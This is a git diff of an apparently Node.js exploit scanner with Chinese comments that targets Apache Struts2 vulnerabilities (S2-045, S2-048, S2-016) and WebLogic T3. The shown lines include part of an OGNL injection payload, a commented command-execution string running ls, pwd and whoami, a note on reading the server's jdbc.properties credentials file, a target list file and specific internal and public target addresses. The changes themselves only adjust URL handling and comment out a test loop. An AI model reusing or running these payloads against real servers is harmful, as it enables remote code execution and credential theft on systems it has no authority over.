@@ -72,7 +72,7 @@ g_nPool = program.pool || g_nPool;
 // 检查对象
 var a = process.argv.splice(2)
 g_szUrl = program.url || 1 == a.length && a[0] || "";
-if(!/[\?;!&]/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
+if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
 	g_szUrl += "/";
 // 安装包
 if(program.install)
@@ -371,6 +371,7 @@ function doStruts2_033(url)
 function doStruts2_048(url,fnCbk)
 {
 	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
+	
 	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
 		"(#_memberAccess?(#_memberAccess=#dm):" + 
 		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
@@ -504,6 +505,7 @@ function doStruts2_045(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
+	// if(/\/$/.test(url))url = url.substr(0, url.length - 1);
 	request(fnOptHeader({method: 'POST',uri: url
 	    ,headers:
 	    {
@@ -1485,10 +1487,12 @@ process.on('exit', (code) =>
 
 if(program.test)
 {
+	// fnMyPut('http://192.168.17.96:8081/manager/');
+	/*
 	console.log("开始内网测试");
 	var a = fs.readFileSync("/Users/xiatian/C/targets.txt").toString().split(/\n/);
 	for(var i in a)
-		fnMyPut(a[i].trim());
+		fnMyPut(a[i].trim());*/
 	// checkWeblogicT3("125.71.203.122","9088");
 	// doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
  	
